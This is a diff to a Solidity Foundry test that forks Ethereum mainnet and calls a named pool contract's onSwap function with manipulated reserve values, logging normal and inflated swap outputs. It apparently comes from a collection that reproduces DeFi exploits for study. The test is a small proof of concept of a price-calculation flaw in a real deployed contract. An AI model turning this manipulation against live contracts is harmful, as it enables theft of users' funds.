@@ -3,16 +3,7 @@
 pragma solidity >=0.7.0 <0.9.0;
 
 import "ds-test/test.sol";
-
-interface IERC20 {
-    function totalSupply() external view returns (uint256);
-
-    function balanceOf(address account) external view returns (uint256);
-
-    function approve(address spender, uint256 amount) external returns (bool);
-
-    function transfer(address to, uint256 value) external returns (bool);
-}
+import "./interface.sol";
 
 interface ISpace {
       function onSwap(
@@ -39,13 +30,19 @@ interface IVault{
 
 }
 
-
 contract ContractTest is DSTest {
     ISpace  space   = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
     IVault.SwapKind kind = IVault.SwapKind(0);
     ISpace.SwapRequest aad = ISpace.SwapRequest(kind ,IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),2000000000000000000,0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,15017009,address(this),address(this),'');
- 
-    function testExample() public {
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 15017009); //fork mainnet at block 15017009
+        cheats.selectFork(mainnetFork);
+    }
+
+    function testExploit() public {
     //onswap:reservesTokenIn, reservesTokenOut;
     emit log_named_uint("Amount Calculated:", space.onSwap(aad,60000000000000000000000000000000,20000000000000000000000000));   //744039785002747962
     emit log_named_uint("Manipulated Amount Calculated:", space.onSwap(aad,2000000000000000000,2000000000000000000));           //1860147027671744844
